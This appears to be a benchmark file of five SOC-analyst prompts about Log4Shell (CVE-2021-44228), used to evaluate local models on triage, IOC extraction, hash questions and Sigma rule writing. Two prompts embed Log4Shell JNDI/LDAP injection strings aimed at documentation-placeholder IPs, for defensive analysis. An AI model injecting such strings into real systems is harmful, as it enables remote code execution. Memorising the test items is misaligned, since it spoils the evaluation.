# Security benchmark prompts for local model evaluation
# Format: one prompt per block, separated by ---
# These represent realistic SOC analyst triage queries — short enough to run in < 60 s on CPU.
#
# Anchor: the Log4Shell exploitation wave (CVE-2021-44228, Apache Log4j2 JNDI RCE, Dec 2021).
# Artifacts are public-shaped: JNDI/LDAP callback strings and the real CVE id. Any IPs/hosts
# are RFC 5737 / RFC 2606 documentation placeholders, NOT real or invented corporate names.

PROMPT_1
You are a SOC analyst triaging a Log4Shell (CVE-2021-44228) detection. A web server access log contains this User-Agent value: "${jndi:ldap://198.51.100.23:1389/Exploit}". In one sentence, classify whether this indicates Log4Shell exploitation activity and state the recommended immediate action.

---

PROMPT_2
You are a threat intelligence analyst. Summarise CVE-2021-44228 (Log4Shell) in three bullet points: what it is, what systems are affected, and the primary detection method. Be factual and concise.

---

PROMPT_3
You are a SOC analyst. Extract the indicator of compromise from this exploit string captured in a log: 'GET / HTTP/1.1 Host: 192.0.2.10 X-Api-Version: ${jndi:ldap://192.0.2.200:1389/a}'. Return only the attacker-controlled callback URL and the destination IP and port it would reach out to.

---

PROMPT_4
You are a malware analyst. A file has SHA-256 hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855. What does this hash represent and what does it tell you about the file?

---

PROMPT_5
You are a security engineer. Write a single Sigma rule (YAML) that detects the Log4Shell JNDI lookup pattern (a "${jndi:" string in an HTTP request header or URI) on a web server. Include the logsource, detection, and condition fields. Tag it with the correct MITRE ATT&CK technique ID.
